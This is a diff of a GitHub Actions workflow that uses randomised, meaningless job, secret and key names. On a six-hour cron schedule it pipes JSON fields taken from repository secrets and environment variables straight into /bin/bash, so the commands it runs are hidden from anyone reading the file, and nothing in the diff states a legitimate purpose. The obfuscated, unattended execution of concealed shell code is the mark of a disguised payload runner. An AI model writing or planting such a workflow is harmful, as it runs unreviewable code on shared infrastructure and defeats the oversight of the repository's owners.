@@ -1,20 +1,24 @@
 name: gewangshui4637
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 2/6 * * *'
-
+    - cron: '18 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gewangshui4637
         env:
-          u1: ${{ secrets.u1 }}
+          sohk265: ${{ secrets.sohk265 }}
         run: |
-          echo $u1 | jq -r .qx34858 | /bin/bash
-          echo $qt8309 | jq -r .lkt9393 | /bin/bash
-          echo $occ7 | jq -r .er58748 | /bin/bash
+          echo $sohk265 | jq -r .k0050 | /bin/bash
+          echo $c55298 | jq -r .v8021 | /bin/bash
+          echo $pl3 | jq -r .yd22626 | /bin/bash
+          echo $aikk181 | jq -r .kpsby0 | /bin/bash
+          echo $yb328 | jq -r .kld7 | /bin/bash
+          echo $zyafe1279 | jq -r .ahsy1 | /bin/bash
+          echo $jatij02276 | jq -r .lqfl49 | /bin/bash
+          echo $a33796 | jq -r .pkgp5254 | /bin/bash
 
